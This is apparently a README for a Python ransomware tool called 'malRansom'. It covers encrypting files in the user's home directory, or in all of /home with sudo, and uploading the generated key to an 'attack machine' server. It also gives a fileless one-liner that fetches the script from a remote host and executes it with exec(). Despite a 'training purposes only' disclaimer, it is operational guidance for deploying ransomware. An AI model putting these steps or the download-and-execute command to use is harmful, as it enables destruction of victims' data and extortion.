# malRansom
Python code that encrypts files in a user's home or users' /home directory.
# Description
First, I would like to say this is for training purposes only and not to be used in any nefarious way. Definitely, 3rawm05nar.py is not a real 
sophisticated piece of code. The encryption/decryption files have only been tested on Redhat 9, Ubuntu 22.04, and Windows 11. Windows takes longer to run the full script and requires that python3 is installed to run. On Redhat, 3rawm05nar.py may have to be ran twice due to missing packages.
# Requirements
There are different ways to conjure up an upload server, but recommend installing the module "uploadserver" for python3. It is easy to use and allows you to
upload your key to your attack machine. It highly recommended that you are able to upload files to python3 server before running script. If you do not want to try this, use upload.py as an alternative.
# Remember
IMPORTANT: Read the comments at the top of the python script before use. Update the Url for the uploading of the key and include port too. Just an idea... the key is generated at execution, but could be downloaded and passed as a string to eliminate the liability of the uploadserver. The code would have to be refactored at that point and a key would have to be generated prior. Windows will only affect the current user's home directory. Linux is ran with sudo and affects all users in /home. Use reveal.py for decryption.
# Windows
python3 .\3raw05nar.py
# Linux
sudo python3 3raw05nar.py
# Python Upload Server
pip3 install uploadserver
Your machine - Example: python3 -m uploadserver 44444
# Fileless Approach
python3 -c ("""from urllib.request import urlopen;url = 'http://< YOUR IP >/< DIRECTORY >/3rawm05nar.py';outtie = urlopen(url).read();getit = outtie.decode('utf-8');exec(outtie)""")
# Additional Resources
NetworkChuck

https://www.youtube.com/watch?v=UtMMjXOlRQc&t=609s

HTTP/HTTPS python upload server

https://pypi.org/project/uploadserver/

Python simplehttpserver

https://stackoverflow.com/questions/39788591/python-simplehttpserver-to-receive-files
